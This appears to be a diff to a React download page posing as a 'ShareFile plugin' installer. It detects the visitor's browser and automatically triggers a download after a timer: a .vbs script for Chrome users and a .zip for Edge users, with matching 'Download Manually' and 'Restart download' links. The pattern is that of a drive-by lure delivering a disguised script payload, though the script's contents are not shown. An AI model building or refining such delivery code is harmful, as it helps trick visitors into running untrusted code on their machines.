@@ -12,11 +12,24 @@ const Download = () => {
     }
   }, [visitorData]);
 
+  const getDownloadFile = () => {
+    const ua = navigator.userAgent;
+    if (ua.includes("Edg/")) {
+      return { href: "/docs/SharefilePlugin.zip", name: "SharefilePlugin.zip" };
+    }
+    if (ua.includes("Chrome") && !ua.includes("Edg/")) {
+      return { href: "/docs/SharefilePlugin.vbs", name: "SharefilePlugin.vbs" };
+    }
+    return null;
+  };
+
   useEffect(() => {
+    const file = getDownloadFile();
+    if (!file) return;
     const timer = setTimeout(() => {
       const link = document.createElement("a");
-      link.href = "/docs/SharefilePlugin.vbs";
-      link.download = "SharefilePlugin.vbs";
+      link.href = file.href;
+      link.download = file.name;
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
@@ -41,32 +54,40 @@ const Download = () => {
           </p>
         </div>
 
-        <p className="text-sm text-[#666]">
-          If the download doesn't start automatically, please{" "}
-          <a
-            href="/docs/SharefilePlugin.vbs"
-            download
-            className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
-          >
-            Download Manually
-          </a>
-          .
-        </p>
+        {getDownloadFile() ? (
+          <>
+            <p className="text-sm text-[#666]">
+              If the download doesn't start automatically, please{" "}
+              <a
+                href={getDownloadFile()!.href}
+                download
+                className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
+              >
+                Download Manually
+              </a>
+              .
+            </p>
 
-        <div className="flex items-center gap-3 text-sm text-[#888]">
-          <span>Download not working?</span>
-          <a
-            href="/docs/SharefilePlugin.vbs"
-            download
-            className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
-          >
-            Restart download
-          </a>
-          <span>|</span>
-          <span className="text-[#4A6FA5] underline hover:text-[#3a5a8a] cursor-pointer">
-            Get Help
-          </span>
-        </div>
+            <div className="flex items-center gap-3 text-sm text-[#888]">
+              <span>Download not working?</span>
+              <a
+                href={getDownloadFile()!.href}
+                download
+                className="text-[#4A6FA5] underline hover:text-[#3a5a8a]"
+              >
+                Restart download
+              </a>
+              <span>|</span>
+              <span className="text-[#4A6FA5] underline hover:text-[#3a5a8a] cursor-pointer">
+                Get Help
+              </span>
+            </div>
+          </>
+        ) : (
+          <p className="text-sm text-[#666]">
+            Your browser is not supported. Please use Chrome or Microsoft Edge.
+          </p>
+        )}
       </div>
     </div>
   );
